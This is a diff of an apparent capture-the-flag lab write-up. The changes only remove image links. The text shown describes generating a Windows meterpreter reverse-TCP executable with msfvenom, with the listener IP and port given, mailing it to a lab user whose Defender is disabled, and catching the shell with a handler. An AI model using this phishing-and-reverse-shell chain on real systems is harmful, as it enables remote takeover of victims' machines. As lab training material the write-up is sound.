@@ -171,11 +171,10 @@ vulnerability is suspected. In this case, it's pointing to the
 
 6. Also, the command shows there is a database called ‘challenger’ and contains a table called to inta_ch06 which is a list of emails
 
-![flag 5](https://github.com/Mays-M/Images-/blob/main/flag5.png)
+
 
 7. Navigate mail.lookout.vle.fi and create account(email used : jeff01ab0168@lookout.vle.fi) then send email to jeff01+studentid@challenger.vle.fi
 
-![flag 5](https://github.com/Mays-M/Images-/blob/main/flag5.png)
 
 8. Seems we need to send an executable file. So
 9. create malicious file with msfvenom (combo of msfplayload and msfencod)
@@ -189,13 +188,13 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp --
 platform windows LHOST=198.18.103.134 LPORT=5433 -f
 exe -o payload.exe
 
-![flag 5](https://github.com/Mays-M/Images-/blob/main/flag5.png)
 
-![flag 5](https://github.com/Mays-M/Images-/blob/main/flag5.png)
+
+
 
 10. The file Payload.exe is created on the kali’s machine to be delivered by email to jeff’s machine ass attachment and when the user will execute the file and because defender is disable to detect when downloading.
 
-![flag 5](https://github.com/Mays-M/Images-/blob/main/flag5.png)
+
 
 11. Now on the handler:
 
@@ -211,7 +210,7 @@ Set lhost 198.18.103.134
 
 
 
-![flag 5](https://github.com/Mays-M/Images-/blob/main/flag5.png)
+
 
 12. Run (at this point you should send the email to jeff) and what to listen. At this point when jeff’s machine execute the file will be able to connect by meterpreter, we can list files on the machine.
 
